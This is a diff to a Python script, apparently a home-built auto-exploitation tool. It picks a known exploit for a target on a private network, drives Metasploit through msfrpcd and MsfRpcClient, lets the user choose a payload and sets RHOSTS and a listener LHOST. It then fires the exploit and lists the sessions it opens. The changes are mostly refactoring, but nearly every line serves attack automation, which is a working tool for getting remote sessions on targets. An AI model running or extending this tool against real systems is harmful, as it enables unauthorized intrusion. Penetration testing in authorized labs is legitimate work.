@@ -23,7 +23,6 @@ CRITICAL = RED + "Critical" + RESET
 SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}
 
 
-
 def show_pwnguin():
     print(
         f"""
@@ -48,8 +47,7 @@ def show_pwnguin():
     )
 
 
-
-IP = "192.168.1.45"
+IP = "192.168.8.121"
 CMD = "./explookup.sh " + IP
 EXPLOIT_LIST = "./exploit_list"
 
@@ -62,18 +60,23 @@ time.sleep(3)
 #     print("[i] Launching scan over @" + IP + " cmd :" + "CMD")
 
 with open(EXPLOIT_LIST, "r+") as f:
-    result = json.loads("[" + f.read() + "]")
+    result = json.loads(f.read())
 
-titles=[]
-for k,pwn in enumerate(result):
-    titles.append([k,pwn["Title"]])
+# Create exploits from the list of research
+exploits = []
+for search in result:
+    exploits += search["RESULTS_EXPLOIT"]
+
+titles = []
+for k, pwn in enumerate(exploits):
+    titles.append([k, pwn["Title"]])
 
 print("[~] Possible exploits :")
 if titles:
-    pprint.pprint(titles, underscore_numbers=True)
+    pprint.pprint(titles)
     print("\n")
 
-choice = input("[~] Please select an exploit")
+choice = input("[~] Please select an exploit: ")
 attack = titles[int(choice)][1][:-12]
 
 print("[V] Exploit selected ! :")
@@ -84,25 +87,26 @@ print("Starting msfrpcd...")
 proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
 time.sleep(5)
 
-#proc = subprocess.run("msfdb reinit", shell=True)
+# proc = subprocess.run("msfdb reinit", shell=True)
 
 client = MsfRpcClient("yourpassword", ssl=True)
 print("\n")
 
 modules = client.modules.search(attack)
-#pprint.pprint(modules)
+# pprint.pprint(modules)
 
 modulus = []
 for mod in modules:
-    modulus.append([mod['type'],mod['fullname']])
+    modulus.append([mod["type"], mod["fullname"]])
 
 print("[~] Available modules :")
 pprint.pprint(modulus)
 
 
 exploit = client.modules.use(modulus[0][0], modulus[0][1])
-print("[V] Selected payloads")
+print("[V] Selected payloads: ", exploit.info)
 
+print("Exploit options :")
 print(exploit.options)
 print("\n")
 
@@ -110,7 +114,8 @@ plds = exploit.targetpayloads()
 print("[~] Available payloads :")
 pprint.pprint(plds)
 
-payload = client.modules.use("payload", plds[7])
+pay_idx = int(input("Which payload do you want to use ? : "))
+payload = client.modules.use("payload", plds[pay_idx])
 print("[V] Payload selected !")
 
 print(payload.missing_required)
@@ -118,10 +123,10 @@ print("\n")
 
 
 exploit["RHOSTS"] = input("Remote HOST : ")
-payload["LHOST"] = "192.168.1.86"
+payload["LHOST"] = "192.168.8.116"
 
 print(exploit.execute(payload=payload))
-time.sleep(10)
+time.sleep(15)
 
 print(client.sessions.list)
 
